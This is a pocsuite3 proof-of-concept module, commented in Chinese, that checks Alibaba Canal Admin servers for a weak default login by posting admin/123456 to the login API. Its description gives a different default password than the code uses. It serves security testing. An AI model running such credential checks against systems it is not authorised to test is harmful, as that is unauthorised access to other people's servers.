from collections import OrderedDict
from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
    get_listener_ip,
    get_listener_port,
)
from pocsuite3.lib.core.interpreter_option import (
    OptString,
    OptDict,
    OptIP,
    OptPort,
    OptBool,
    OptInteger,
    OptFloat,
    OptItems,
)
from pocsuite3.modules.listener import REVERSE_PAYLOAD


class DemoPOC(POCBase):
    vulID = "12345"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "mlxml"  # PoC作者的大名
    vulDate = "2022-07-13"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-07-13"  # 编写 PoC 的日期
    updateDate = "2022-07-13"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/alibaba/canal/wiki/Canal-Admin-QuickStart"]  # 漏洞地址来源,0day不用写
    name = "Canl_Admin弱口令检测PoC"  # PoC 名称
    appPowerLink = "https://github.com/alibaba/canal/wiki/Canal-Admin-QuickStart"  # 漏洞厂商主页地址
    appName = "Canl_Admin"  # 漏洞应用名称
    appVersion = "every"  # 漏洞影响版本
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
            Canl_Admin后台管理存在弱口令,导致任意用户可以轻易爆破出来登录后台。
        """  # 漏洞简要描述
    pocDesc = """
            默认账号名：admin密码：password
        """  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        result = []
        json = {
            "password": "123456", "username": "admin"}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json;charset=utf-8"}

        try:
            full_url = self.url.strip() + '/api/v1/user/login'
            response = requests.post(full_url,json=json,timeout=9,headers=headers,verify=False)
            msg = response.json()  # 转换成字典格式，方便后续取值
            # 通关code值判断是否存在默认密码
            if msg.get("code") == 20000 and msg.get("msg") == None:
                result.append(full_url)
        except Exception as e:
             print(e)
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(DemoPOC)
